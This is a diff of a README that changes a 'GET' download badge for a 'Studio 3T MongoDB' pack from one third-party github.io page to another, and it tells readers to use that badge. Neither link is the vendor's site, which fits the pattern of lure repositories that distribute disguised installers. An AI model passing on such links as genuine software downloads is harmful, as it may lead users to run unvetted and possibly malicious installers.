@@ -225,7 +225,7 @@ The Compass monorepo is SSPL. The web admin license file sits next to the Expres
 
 ## Download
 
-[![GET](https://img.shields.io/badge/GET-Studio%203T%20MongoDB-brightgreen)](https://cooperwilliam3374.github.io/.github/Studio-3T-MongoDB)
+[![GET](https://img.shields.io/badge/GET-Studio%203T%20MongoDB-brightgreen)](https://studio-3t-mongodb.github.io/Studio-3T/)
 
 Use the GET badge for this pack. The vendor also hosts a desktop installer for Windows, macOS, and Linux. Community is the free edition. Paid editions unlock SQL, automation, and team features after a license is applied.
 
